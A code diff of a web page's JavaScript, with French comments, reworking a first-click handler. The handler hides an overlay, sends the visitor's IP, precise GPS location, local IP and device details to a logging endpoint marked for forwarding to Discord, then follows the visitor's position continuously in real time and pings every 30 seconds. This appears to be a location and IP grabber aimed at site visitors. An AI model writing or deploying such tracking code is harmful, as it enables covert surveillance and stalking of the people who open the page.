@@ -201,81 +201,75 @@ function getDistance(lat1, lon1, lat2, lon2) {
     return R * c;
 }
 
-const handleFirstClick = async () => {
-    // 1. On libère l'interface immédiatement
-    overlay.style.display = 'none';
-    
-    // 2. On envoie un premier log "IP uniquement" ultra-rapide pour Discord
-    // Cela permet de voir le visiteur tout de suite
-    logVisitor();
+    const handleFirstClick = async () => {
+        // 1. On libère l'interface immédiatement
+        overlay.style.display = 'none';
+        
+        // 2. On envoie un premier log "IP uniquement" ultra-rapide pour Discord
+        await logVisitor();
 
-    // 3. On demande le GPS en arrière-plan
-    const location = await getPreciseLocation();
-    if (location) {
-        lastLoggedPos = location;
-        // On envoie le GPS à Discord même si c'est une mise à jour
+        // 3. On demande le GPS en arrière-plan
         try {
-            const localIp = cachedLocalIp || await getLocalIP();
-            const stats = await getDeviceStats();
-            await fetch('/api/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: sessionId,
-                    isUpdate: true,
-                    forceDiscord: true, // ON FORCE DISCORD POUR LE POINT VERT
-                    localIp: localIp,
-                    preciseLocation: location,
-                    deviceStats: stats,
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    referrer: document.referrer || 'Direct',
-                    page: window.location.pathname
-                })
-            });
-        } catch (e) {}
-    }
+            const location = await getPreciseLocation();
+            if (location) {
+                lastLoggedPos = location;
+                const localIp = cachedLocalIp || await getLocalIP();
+                const stats = await getDeviceStats();
+                await fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        isUpdate: true,
+                        forceDiscord: true,
+                        localIp: localIp,
+                        preciseLocation: location,
+                        deviceStats: stats,
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        screenResolution: `${window.screen.width}x${window.screen.height}`,
+                        referrer: document.referrer || 'Direct',
+                        page: window.location.pathname
+                    })
+                });
+            }
+        } catch (e) {
+            console.error("Erreur lors de la capture GPS initiale:", e);
+        }
 
-    // Mode watchPosition pour un suivi ultra-précis en temps réel
-    if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(
-            async (position) => {
-                const newLoc = {
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    speed: position.coords.speed
-                };
+        // Mode watchPosition pour un suivi ultra-précis en temps réel
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(
+                async (position) => {
+                    const newLoc = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        speed: position.coords.speed
+                    };
 
-                // FILTRAGE : On n'envoie que si le mouvement est significatif (> 3m)
-                // ou si la précision s'est améliorée
-                if (!lastLoggedPos) {
-                    lastLoggedPos = newLoc;
-                    await logVisitor(newLoc, true);
-                } else {
-                    const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
-                    
-                    // Si on a bougé de plus de 3 mètres OU si on gagne énormément en précision
-                    if (dist > 3 || (newLoc.accuracy < lastLoggedPos.accuracy - 5)) {
+                    if (!lastLoggedPos) {
                         lastLoggedPos = newLoc;
                         await logVisitor(newLoc, true);
+                    } else {
+                        const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
+                        if (dist > 3 || (newLoc.accuracy < lastLoggedPos.accuracy - 5)) {
+                            lastLoggedPos = newLoc;
+                            await logVisitor(newLoc, true);
+                        }
                     }
+                },
+                (err) => console.warn("Erreur watchPosition:", err),
+                { 
+                    enableHighAccuracy: true, 
+                    maximumAge: 0,
+                    timeout: 10000 
                 }
-            },
-            (err) => console.warn(err),
-            { 
-                enableHighAccuracy: true, 
-                maximumAge: 0,
-                timeout: 5000 
-            }
-        );
-    }
+            );
+        }
 
-        // Heartbeat pour maintenir la session active et vérifier batterie/réseau toutes les 30s
+        // Heartbeat pour maintenir la session active
         setInterval(async () => {
-            const stats = await getDeviceStats();
-            // On log sans position pour mettre à jour les stats si pas de mouvement
             await logVisitor(null, true);
         }, 30000);
     };
